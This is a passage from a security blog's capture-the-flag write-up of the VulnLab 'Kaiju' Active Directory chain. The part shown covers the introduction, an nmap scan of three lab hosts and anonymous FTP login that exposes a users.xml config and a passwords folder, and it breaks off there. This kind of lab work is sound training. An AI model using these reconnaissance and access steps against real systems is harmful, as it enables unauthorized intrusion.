<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kaiju - VulnLab</title>
    <meta name="description" content="Art√≠culos t√©cnicos sobre ciberseguridad, Active Directory, Binary Exploitation y m√°s">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
    <link href="/css/styles.css" rel="stylesheet">
    <link href="/css/articles.css" rel="stylesheet">
    <link href="/css/monokai.css" rel="stylesheet">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
</head>
<body>
    <button class="sidebar-toggle" id="sidebarToggle">‚ò∞</button>
    <div class="container-fluid">
        <div class="row">
            <!-- Sidebar -->
            <aside class="sidebar" id="sidebar">
                <div class="sidebar-logo">
                    <img src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
                    <h3>elswix</h3>
                </div>
                <nav>
                    <ul class="nav-menu">   
                        <li class="nav-item">
                            <a href="/" class="nav-link">
                                <i>üè†</i>
                                <span>Home</span>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a href="/articles" class="nav-link active">
                                <i>üìù</i>
                                <span>Articles</span>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a href="/writeups" class="nav-link">
                                <i>üíª</i>
                                <span>WriteUps</span>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a href="/notes" class="nav-link">
                                <i>üìö</i>
                                <span>Notes</span>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link">
                                <i>‚ö°</i>
                                <span>KL-Sunset</span>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a href="/about" class="nav-link">
                                <i>üë§</i>
                                <span>About me</span>
                            </a>
                        </li>
                    </ul>
                </nav>
            </aside>

            <!-- Main Content -->
            <main>
                <!-- Hero Section -->
                <section class="hero mb-5">
                    <img src="/writeups/vl/hard/kaiju/img/kaiju.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=üìù'">
                    <h2>Kaiju - VulnLab</h2>
                    <p>Kaiju - VulnLabhard-difficulty chain</p>
                </section>

                <section class="article-content">
<div class="article-container">
<div class="article-content-main">
<div class="highlight"><pre><span></span><span class="n">Chain</span><span class="p">:</span> <span class="n">Kaiju</span>
<span class="n">Difficult</span><span class="p">:</span> <span class="n">Hard</span>
<span class="n">Platform</span><span class="p">:</span> <span class="n">VulnLab</span>
</pre></div>
<h3>Introduction</h3><br/>
<p>Today, we‚Äôll walk through <strong>Kaiju</strong>, a hard-difficulty chain from VulnLab. This lab simulates a multi-host Active Directory environment where initial access is obtained through misconfigurations in exposed services. From there, we pivot across different machines, escalate privileges, and eventually compromise the domain. Along the way, we‚Äôll explore techniques such as:</p><br/>
<ul>
<li>
<p>Enumerating and exploiting FTP misconfigurations.</p><br/>
</li>
<li>
<p>Leveraging weakly protected credentials and FileZilla administration.</p><br/>
</li>
<li>
<p>Abusing group memberships to compromise KeePass.</p><br/>
</li>
<li>
<p>Extracting and reusing credentials for lateral movement.</p><br/>
</li>
<li>
<p>Setting up SOCKS proxies, SSH tunnels, and Port Bending with StreamDivert to bypass firewall restrictions.</p><br/>
</li>
<li>
<p>Exploiting <strong>Active Directory Certificate Services (ADCS)</strong> misconfigurations (ESC8) for domain compromise.</p><br/>
</li>
</ul>
<p>One of the main reasons I chose to document this chain is that my recent articles have focused heavily on ADCS internals and abuse scenarios. I wanted to take the opportunity to demonstrate one of my favorite ADCS exploitation techniques in a CTF-style environment, showing how ADCS exploitation can fit naturally into a multi-step attack path.</p><br/>
<p>It‚Äôs worth mentioning that this is a Chain Lab, not a Red Team Lab. That means the focus here is on demonstrating and practicing exploitation techniques in a controlled environment, not on stealth, evasion, or OPSEC. Today, we'll focus on the exploitation steps without worrying about detection. However, upcoming writeups will also cover Red Team Labs, where OPSEC-aware tradecraft and stealthier approaches will be emphasized.</p><br/>
<h3>Recon</h3><br/>
<p>As this is a Chain lab, there are multiple machines to enumerate. Initially, we'll conduct a port scan to discover open ports on the victim machines using <code>nmap</code>. </p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">iL</span> <span class="n">targets</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">Pn</span>
<span class="n">Stats</span><span class="p">:</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">37</span> <span class="n">elapsed</span><span class="p">;</span> <span class="mi">0</span> <span class="n">hosts</span> <span class="n">completed</span> <span class="p">(</span><span class="mi">3</span> <span class="n">up</span><span class="p">),</span> <span class="mi">3</span> <span class="n">undergoing</span> <span class="n">Service</span> <span class="n">Scan</span>
<span class="n">Service</span> <span class="n">scan</span> <span class="n">Timing</span><span class="p">:</span> <span class="n">About</span> <span class="mf">80.00</span><span class="o">%</span> <span class="n">done</span><span class="p">;</span> <span class="n">ETC</span><span class="p">:</span> <span class="mi">14</span><span class="p">:</span><span class="mi">06</span> <span class="p">(</span><span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">05</span> <span class="n">remaining</span><span class="p">)</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.221.53</span> <span class="p">(</span><span class="mf">10.10.221.53</span><span class="p">)</span>
<span class="n">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.23</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">999</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
<span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>       <span class="n">VERSION</span>
<span class="mi">3389</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ms</span><span class="o">-</span><span class="n">wbt</span><span class="o">-</span><span class="n">server</span> <span class="n">Microsoft</span> <span class="n">Terminal</span> <span class="n">Services</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">BERSRV100</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">08</span><span class="n">T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">47</span>
<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2026</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">10</span><span class="n">T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">47</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">09</span><span class="n">T14</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">09</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">1</span><span class="n">s</span> <span class="n">from</span><span class="w"> </span><span class="nn">scanner</span> <span class="n">time</span><span class="o">.</span>
<span class="o">|</span> <span class="n">rdp</span><span class="o">-</span><span class="n">ntlm</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> 
<span class="o">|</span>   <span class="n">Target_Name</span><span class="p">:</span> <span class="n">KAIJU</span>
<span class="o">|</span>   <span class="n">NetBIOS_Domain_Name</span><span class="p">:</span> <span class="n">KAIJU</span>
<span class="o">|</span>   <span class="n">NetBIOS_Computer_Name</span><span class="p">:</span> <span class="n">BERSRV100</span>
<span class="o">|</span>   <span class="n">DNS_Domain_Name</span><span class="p">:</span> <span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="o">|</span>   <span class="n">DNS_Computer_Name</span><span class="p">:</span> <span class="n">BERSRV100</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="o">|</span>   <span class="n">DNS_Tree_Name</span><span class="p">:</span> <span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="o">|</span>   <span class="n">Product_Version</span><span class="p">:</span> <span class="mf">10.0.20348</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">System_Time</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">09</span><span class="n">T14</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">03</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Windows</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span>

<span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
<span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="n">skew</span><span class="p">:</span> <span class="n">mean</span><span class="p">:</span> <span class="mi">1</span><span class="n">s</span><span class="p">,</span> <span class="n">deviation</span><span class="p">:</span> <span class="mi">0</span><span class="n">s</span><span class="p">,</span> <span class="n">median</span><span class="p">:</span> <span class="mi">0</span><span class="n">s</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.221.54</span> <span class="p">(</span><span class="mf">10.10.221.54</span><span class="p">)</span>
<span class="n">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.23</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">997</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
<span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>       <span class="n">VERSION</span>
<span class="mi">21</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ftp</span><span class="n">?</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">filezilla</span><span class="o">-</span><span class="n">server</span> <span class="bp">self</span> <span class="n">signed</span> <span class="n">certificate</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">17</span><span class="n">T14</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">49</span>
<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2024</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">17</span><span class="n">T14</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">49</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="n">TLS</span> <span class="n">randomness</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">represent</span> <span class="n">time</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>           <span class="n">OpenSSH</span> <span class="n">for_Windows_8</span><span class="mf">.1</span> <span class="p">(</span><span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mi">3072</span> <span class="mi">08</span><span class="p">:</span><span class="n">c7</span><span class="p">:</span><span class="n">c6</span><span class="p">:</span><span class="mi">6</span><span class="n">a</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">2</span><span class="n">a</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">3</span><span class="n">f</span><span class="p">:</span><span class="mi">9</span><span class="n">e</span><span class="p">:</span><span class="mi">88</span><span class="p">:</span><span class="mi">0</span><span class="n">c</span><span class="p">:</span><span class="n">e2</span><span class="p">:</span><span class="n">ff</span><span class="p">:</span><span class="mi">2</span><span class="n">c</span><span class="p">:</span><span class="n">b9</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="mi">75</span><span class="p">:</span><span class="mi">96</span><span class="p">:</span><span class="n">f0</span><span class="p">:</span><span class="mi">68</span><span class="p">:</span><span class="mi">8</span><span class="n">a</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">69</span><span class="p">:</span><span class="n">ab</span><span class="p">:</span><span class="n">e4</span><span class="p">:</span><span class="mi">9</span><span class="n">b</span><span class="p">:</span><span class="mi">3</span><span class="n">e</span><span class="p">:</span><span class="mi">5</span><span class="n">a</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="n">a8</span><span class="p">:</span><span class="n">ab</span><span class="p">:</span><span class="mi">24</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">d4</span><span class="p">:</span><span class="mi">8</span><span class="n">e</span><span class="p">:</span><span class="n">ad</span><span class="p">:</span><span class="n">d3</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="n">a9</span><span class="p">:</span><span class="mi">7</span><span class="n">b</span><span class="p">:</span><span class="mi">7</span><span class="n">b</span><span class="p">:</span><span class="mi">7</span><span class="n">b</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">9</span><span class="n">f</span><span class="p">:</span><span class="mi">86</span><span class="p">:</span><span class="n">cb</span><span class="p">:</span><span class="n">ab</span><span class="p">:</span><span class="n">a3</span><span class="p">:</span><span class="mi">55</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
<span class="mi">3389</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ms</span><span class="o">-</span><span class="n">wbt</span><span class="o">-</span><span class="n">server</span> <span class="n">Microsoft</span> <span class="n">Terminal</span> <span class="n">Services</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">08</span><span class="n">T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">21</span>
<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2026</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">10</span><span class="n">T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">21</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">09</span><span class="n">T14</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">09</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">1</span><span class="n">s</span> <span class="n">from</span><span class="w"> </span><span class="nn">scanner</span> <span class="n">time</span><span class="o">.</span>
<span class="o">|</span> <span class="n">rdp</span><span class="o">-</span><span class="n">ntlm</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> 
<span class="o">|</span>   <span class="n">Target_Name</span><span class="p">:</span> <span class="n">KAIJU</span>
<span class="o">|</span>   <span class="n">NetBIOS_Domain_Name</span><span class="p">:</span> <span class="n">KAIJU</span>
<span class="o">|</span>   <span class="n">NetBIOS_Computer_Name</span><span class="p">:</span> <span class="n">BERSRV200</span>
<span class="o">|</span>   <span class="n">DNS_Domain_Name</span><span class="p">:</span> <span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="o">|</span>   <span class="n">DNS_Computer_Name</span><span class="p">:</span> <span class="n">BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="o">|</span>   <span class="n">DNS_Tree_Name</span><span class="p">:</span> <span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="o">|</span>   <span class="n">Product_Version</span><span class="p">:</span> <span class="mf">10.0.20348</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">System_Time</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">09</span><span class="n">T14</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">03</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Windows</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span>

<span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
<span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="n">skew</span><span class="p">:</span> <span class="n">mean</span><span class="p">:</span> <span class="mi">1</span><span class="n">s</span><span class="p">,</span> <span class="n">deviation</span><span class="p">:</span> <span class="mi">0</span><span class="n">s</span><span class="p">,</span> <span class="n">median</span><span class="p">:</span> <span class="mi">0</span><span class="n">s</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.221.55</span> <span class="p">(</span><span class="mf">10.10.221.55</span><span class="p">)</span>
<span class="n">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.23</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">999</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
<span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>       <span class="n">VERSION</span>
<span class="mi">3389</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ms</span><span class="o">-</span><span class="n">wbt</span><span class="o">-</span><span class="n">server</span> <span class="n">Microsoft</span> <span class="n">Terminal</span> <span class="n">Services</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">BERSRV105</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">08</span><span class="n">T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">29</span>
<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2026</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">10</span><span class="n">T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">29</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">09</span><span class="n">T14</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">08</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="mi">0</span><span class="n">s</span> <span class="n">from</span><span class="w"> </span><span class="nn">scanner</span> <span class="n">time</span><span class="o">.</span>
<span class="o">|</span> <span class="n">rdp</span><span class="o">-</span><span class="n">ntlm</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> 
<span class="o">|</span>   <span class="n">Target_Name</span><span class="p">:</span> <span class="n">KAIJU</span>
<span class="o">|</span>   <span class="n">NetBIOS_Domain_Name</span><span class="p">:</span> <span class="n">KAIJU</span>
<span class="o">|</span>   <span class="n">NetBIOS_Computer_Name</span><span class="p">:</span> <span class="n">BERSRV105</span>
<span class="o">|</span>   <span class="n">DNS_Domain_Name</span><span class="p">:</span> <span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="o">|</span>   <span class="n">DNS_Computer_Name</span><span class="p">:</span> <span class="n">BERSRV105</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="o">|</span>   <span class="n">Product_Version</span><span class="p">:</span> <span class="mf">10.0.20348</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">System_Time</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">09</span><span class="n">T14</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">02</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Windows</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span>

<span class="n">Post</span><span class="o">-</span><span class="n">scan</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
<span class="o">|</span> <span class="n">clock</span><span class="o">-</span><span class="n">skew</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mi">1</span><span class="n">s</span><span class="p">:</span> 
<span class="o">|</span>     <span class="mf">10.10.221.53</span>
<span class="o">|</span>     <span class="mf">10.10.221.54</span>
<span class="o">|</span><span class="n">_</span>    <span class="mf">10.10.221.54</span>
<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">3</span> <span class="n">IP</span> <span class="n">addresses</span> <span class="p">(</span><span class="mi">3</span> <span class="n">hosts</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="n">in</span> <span class="mf">75.95</span> <span class="n">seconds</span>
</pre></div>
<p>As observed in the output, two of the three machines only have port <code>3389</code> (RDP) open, which is useless at this stage without valid credentials. However, the <code>BERSRV200</code> server is also exposing ports <code>21</code> (FTP) and <code>22</code> (SSH). While SSH requires valid credentials to log in, FTP might allow anonymous access.</p><br/>
<p>When reviewing the RDP analysis for each computer, we noticed the presence of a domain, <code>kaiju.vl</code>. This suggests that we are dealing with an Active Directory environment. Due to certain firewall rules, however, we cannot reach services such as Kerberos or LDAP. Additionally, the <code>DNS_Computer_Name</code> field for each host does not reveal much about the role of the machine. Unlike other environments where names like <code>dc01.domain.local</code> clearly identify a domain controller, here we cannot determine the purpose of each computer.</p><br/>
<p>Before enumerating FTP, I‚Äôll add the DNS information returned from port <code>3389</code> to my <code>/etc/hosts</code> file, like so:</p><br/>
<div class="highlight"><pre><span></span><span class="mf">10.10.221.53</span> <span class="n">BERSRV100</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="mf">10.10.221.54</span> <span class="n">BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="mf">10.10.221.55</span> <span class="n">BERSRV105</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
</pre></div>
<h3>FTP - Port 21 (BERSRV200)</h3><br/>
<p>Since the other exposed services require valid credentials, let‚Äôs check if FTP allows anonymous access. The FTP service is running on a FileZilla Server (as identified in the previous analysis), so if anonymous login is enabled, we should be able to connect using <code>ftp</code> as username and an empty password.</p><br/>
<p>For context, <strong>FileZilla Server</strong> is an open-source FTP and FTPS server solution widely used on Windows environments. It allows administrators to configure user accounts, manage permissions, and define which directories can be shared with clients. Because of its simplicity and ease of setup, it‚Äôs a common choice for internal file sharing or lightweight FTP deployments. </p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ftp</span> <span class="n">BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="n">Connected</span> <span class="n">to</span> <span class="n">BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="o">.</span>
<span class="mi">220</span><span class="o">-</span><span class="n">FileZilla</span> <span class="n">Server</span> <span class="mf">1.8.0</span>
<span class="mi">220</span> <span class="n">Please</span> <span class="n">visit</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">filezilla</span><span class="o">-</span><span class="n">project</span><span class="o">.</span><span class="n">org</span><span class="o">/</span>
<span class="n">Name</span> <span class="p">(</span><span class="n">BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="p">:</span><span class="n">elswix</span><span class="p">):</span> <span class="n">ftp</span>
<span class="mi">331</span> <span class="n">Please</span><span class="p">,</span> <span class="n">specify</span> <span class="n">the</span> <span class="n">password</span><span class="o">.</span>
<span class="n">Password</span><span class="p">:</span> 
<span class="mi">230</span> <span class="n">Login</span> <span class="n">successful</span><span class="o">.</span>
<span class="n">Remote</span> <span class="n">system</span> <span class="nb">type</span> <span class="n">is</span> <span class="n">UNIX</span><span class="o">.</span>
<span class="n">Using</span> <span class="n">binary</span> <span class="n">mode</span> <span class="n">to</span> <span class="n">transfer</span> <span class="n">files</span><span class="o">.</span>
<span class="nd">ftp</span><span class="nd">&gt;</span>
</pre></div>
<p>As shown, we were able to connect to the FTP service using anonymous credentials.</p><br/>
<p>Upon listing the exposed directories, we found some interesting files:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">ftp</span><span class="nd">&gt;</span> <span class="n">ls</span> <span class="n">Configs</span><span class="o">/</span><span class="n">FileZilla</span><span class="o">/</span>
<span class="mi">229</span> <span class="n">Entering</span> <span class="n">Extended</span> <span class="n">Passive</span> <span class="n">Mode</span> <span class="p">(</span><span class="o">|||</span><span class="mi">65018</span><span class="o">|</span><span class="p">)</span>
<span class="mi">150</span> <span class="n">Starting</span> <span class="n">data</span> <span class="n">transfer</span><span class="o">.</span>
<span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>            <span class="mi">2236</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">users</span><span class="o">.</span><span class="n">xml</span>
<span class="mi">226</span> <span class="n">Operation</span> <span class="n">successful</span>
<span class="nd">ftp</span><span class="nd">&gt;</span> <span class="n">ls</span> <span class="n">Passwords</span>
<span class="mi">229</span> <span class="n">Entering</span> <span class="n">Extended</span> <span class="n">Passive</span> <span class="n">Mode</span> <span class="p">(</span><span class="o">|||</span><span class="mi">65515</span><span class="o">|</span><span class="p">)</span>
<span class="mi">150</span> <span class="n">Starting</span> <span class="n">data</span> <span class="n">transfer</span><span class="o">.</span>
<span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>              <span class="mi">20</span> <span class="n">Jan</span> <span class="mi">30</span>  <span class="mi">2024</span> <span class="n">firewalls</span><span class="o">.</span><span class="n">txt</span>
